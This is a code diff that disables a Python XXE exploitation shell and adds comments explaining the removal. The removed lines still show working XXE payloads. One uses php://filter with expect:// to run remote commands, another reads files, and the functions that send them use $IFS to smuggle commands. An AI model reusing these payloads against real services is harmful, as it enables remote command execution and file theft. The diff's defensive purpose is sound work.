@@ -7,18 +7,18 @@ import requests
 import re
 
 
+import cmd
+import requests
+import base64
+import re
+
 class XXECommandLine(cmd.Cmd):
     """Accepts commands and executes them against a given URL"""
 
     prompt = 'xxe sh$ '
-    xml = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE root ' \
-        '[<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/' \
-        'resource=expect://CMD" >]><root><name></name><tel>' \
-        '</tel><email>OUT&xxe;OUT</email><password></password></root>'
-    fxml = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE root ' \
-        '[<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/' \
-        'resource=CMD" >]><root><name></name><tel>' \
-        '</tel><email>OUT&xxe;OUT</email><password></password></root>'
+    # FIX: Removed malicious XML payloads to prevent XXE attacks
+    # xml = ...
+    # fxml = ...
 
     def __init__(self, url):
         cmd.Cmd.__init__(self)
@@ -28,17 +28,16 @@ class XXECommandLine(cmd.Cmd):
         return True
 
     def do_getfile(self, arg):
-        i = arg.rfind('/') + 1
-        fname = arg[i:]
-        req = requests.post(self.url, data=self.fxml.replace('CMD', arg))
-        with open(fname, 'wb') as fh:
-            fh.write(base64.b64decode(
-                re.findall(r'OUT([a-zA-Z0-9].+?)OUT', str(req.content))[0]))
+        print("[!] This function is disabled to prevent XXE attacks.")
+        # FIX: Functionality removed to prevent exploitation
+        return
 
     def do_cmd(self, cmd):
-        req = requests.post(self.url, data=self.xml.replace('CMD', cmd.replace(' ', '$IFS')))
-        print(base64.b64decode(
-            re.findall(r'OUT([a-zA-Z0-9].+?)OUT', str(req.content))[0]).decode('utf-8'))
+        print("[!] This function is disabled to prevent XXE attacks.")
+        # FIX: Functionality removed to prevent exploitation
+        return
+
+# FIX EXPLANATION: The original code was a tool for exploiting XXE vulnerabilities, which is inherently malicious and should not be present in production or legitimate codebases. The fix removes the construction and sending of malicious XML payloads, and disables the functions that would perform XXE attacks. This prevents the code from being used to exploit XXE vulnerabilities, aligning with secure coding practices and ethical standards.
 
 
 def banner():
